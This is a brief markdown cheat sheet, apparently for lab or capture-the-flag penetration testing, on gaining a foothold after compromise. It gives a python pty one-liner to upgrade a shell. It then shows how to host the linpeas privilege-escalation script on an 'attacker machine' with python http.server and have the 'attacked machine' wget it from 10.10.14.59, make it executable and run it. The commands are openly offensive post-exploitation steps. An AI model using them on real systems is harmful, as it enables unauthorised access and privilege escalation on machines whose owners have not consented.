---
title: "Foothold cheat sheet"
date: 2024-02-11
---
## Get pretty shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
## Get linpeas
On the server side (attacker machine):
```
python3 -m http.server 8080
```
On the attacked machine:
```
wget http://10.10.14.59:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```